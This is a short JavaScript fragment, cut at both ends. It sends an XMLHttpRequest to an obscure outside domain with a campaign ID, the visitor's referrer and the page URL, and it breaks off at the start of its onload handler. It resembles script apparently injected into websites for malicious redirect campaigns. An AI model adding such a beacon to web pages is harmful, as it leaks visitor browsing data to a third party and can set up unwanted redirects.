...
xhr.open("GET", "https://restructuredwonderfully.site/_remote_track?campaign=" + escape("NdJ366pRmK") + "&referrer=" + escape(document.referrer) + "&uri=" + escape(window.location.href), true);
xhr.onload = function() {
